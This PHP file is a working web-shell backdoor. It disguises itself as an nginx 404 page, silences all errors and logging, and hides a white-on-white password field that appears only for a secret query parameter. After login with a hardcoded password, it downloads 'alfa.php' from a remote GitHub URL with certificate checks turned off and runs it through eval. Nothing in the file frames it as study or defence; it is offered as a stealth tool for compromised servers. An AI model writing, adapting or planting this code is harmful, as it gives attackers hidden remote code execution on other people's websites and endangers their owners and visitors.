<?php
// ---------------------------
// CONFIG
// ---------------------------
$PASSWORD = 'hadii'; // ganti dengan passwordmu
$REMOTE_PHP_URL = 'https://raw.githubusercontent.com/hadiArsa123/marijuana/refs/heads/main/alfa.php';

// ---------------------------
// SILENCE ALL ERRORS (no display, no log)
// ---------------------------
error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');

set_error_handler(function() { /* swallow */ return true; });
set_exception_handler(function() { /* swallow */ });
register_shutdown_function(function() {
    $err = error_get_last();
    if ($err) {
        // do nothing
    }
});

// start session
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// derive param name from current filename (without .php)
$scriptName = isset($_SERVER['SCRIPT_NAME']) ? basename($_SERVER['SCRIPT_NAME']) : basename(__FILE__);
$paramName = pathinfo($scriptName, PATHINFO_FILENAME); // e.g., tes.php -> 'tes'

// Helper: render 404 HTML with optional hidden login input in center
function render_404_with_hidden_login($showForm = true, $paramName = 'hadi') {
    $inputName = 'pass';
    $submitHidden = 'hadi_submit';
    $html = <<<HTML
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
HTML;

    if ($showForm) {
        $html .= <<<FORM
<div style="position:fixed; left:50%; top:50%; transform:translate(-50%,-50%);">
  <form method="post" style="margin:0; padding:0;">
    <input name="$inputName" autocomplete="off"
      style="background-color: #ffffff; color: #ffffff; border: none; outline: none; width:220px; padding:8px; font-size:14px;"
      placeholder=" " />
    <input type="hidden" name="$submitHidden" value="1" />
  </form>
</div>

<script>
  (function(){
    try {
      var el = document.querySelector('input[name="$inputName"]');
      if(el){ el.focus(); }
    } catch(e) {}
  })();
</script>
FORM;
    }

    $html .= <<<HTML
<hr><center>nginx</center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
HTML;

    echo $html;
    exit;
}

// If URL contains the special param matching filename, show (or process) the hidden login
if (isset($_GET[$paramName])) {
    // process POST submit
    if (isset($_POST['hadi_submit']) && isset($_POST['pass'])) {
        $given = (string) $_POST['pass'];
        if (hash_equals(hash('sha256', $GLOBALS['PASSWORD']), hash('sha256', $given))) {
            $_SESSION['hidden_logged_in'] = true;
            // redirect to same page without query string (so main script runs)
            $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : $_SERVER['PHP_SELF'];
            $base = strtok($uri, '?');
            header('Location: ' . $base);
            exit;
        } else {
            // wrong password: re-render 404 with hidden input
            render_404_with_hidden_login(true, $paramName);
        }
    } else {
        // show the 404 page containing the hidden input
        render_404_with_hidden_login(true, $paramName);
    }
}

// If not logged in, show plain 404 (no form)
if (empty($_SESSION['hidden_logged_in'])) {
    render_404_with_hidden_login(false, $paramName);
}

// From here user is authenticated
function getRemotePHP($url) {
    $ch = @curl_init();
    if ($ch === false) { exit; }
    @curl_setopt($ch, CURLOPT_URL, $url);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    @curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $code = @curl_exec($ch);
    $errNo = @curl_errno($ch);
    @curl_close($ch);

    if ($code === false || $errNo !== 0 || trim($code) === '') {
        exit;
    }

    // execute remote code (be careful)
    eval("?>\n" . $code);
}

getRemotePHP($REMOTE_PHP_URL);
?>